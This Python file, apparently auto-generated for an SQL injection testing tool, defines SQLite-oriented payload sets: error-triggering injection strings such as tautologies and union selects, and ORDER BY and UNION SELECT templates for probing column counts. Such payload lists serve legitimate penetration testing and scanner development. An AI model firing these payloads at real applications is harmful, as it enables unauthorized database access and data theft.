# Auto-generated file: SQL injection patterns

ERRORS_INJ = {
    "' or '1'='1",
    "' group by 100--",
    "' order by 999--",
    "' or '1'='2",
    '"--',
    "' union select null,null--",
    '""',
    "')",
    '`',
    "' union select 1--",
    "''",
    "'))",
    "'--",
    '" or 1=1--',
    "'-- -",
    '"',
    "' and 1/0--",
    '"))',
    '")',
    "' or 1=1--",
    "' group by 1--",
    "' union select null--",
    '" or "1"="1',
    "'",
    "' order by 1--",
    "' order by 100--",
    "' union select 1,2--",
}

NB_COLUMN_PATTERNS = [
    {'payload': "' ORDER BY #?#--", 'placeholder': 'INT'},
    {'payload': "' ORDER BY #?#-- -", 'placeholder': 'INT'},
    {'payload': '" ORDER BY #?#--', 'placeholder': 'INT'},
    {'payload': '` ORDER BY #?#--', 'placeholder': 'INT'},
    {'payload': "' GROUP BY #?#--", 'placeholder': 'INT'},
    {'payload': "' GROUP BY #?#-- -", 'placeholder': 'INT'},
    {'payload': "') ORDER BY #?#--", 'placeholder': 'INT'},
    {'payload': '") ORDER BY #?#--', 'placeholder': 'INT'},
    {'payload': "')) ORDER BY #?#--", 'placeholder': 'INT'},
    {'payload': '")) ORDER BY #?#--', 'placeholder': 'INT'},
    {'payload': 'ORDER BY #?#--', 'placeholder': 'INT'},
    {'payload': 'ORDER BY #?#-- -', 'placeholder': 'INT'},
    {'payload': "' UNION SELECT #?#--", 'placeholder': 'NULL_LIST'},
    {'payload': "' UNION ALL SELECT #?#--", 'placeholder': 'NULL_LIST'},
]

SQLITE_ERROR = {
    'errors': ERRORS_INJ,
    'nb_column_patterns': NB_COLUMN_PATTERNS,
}
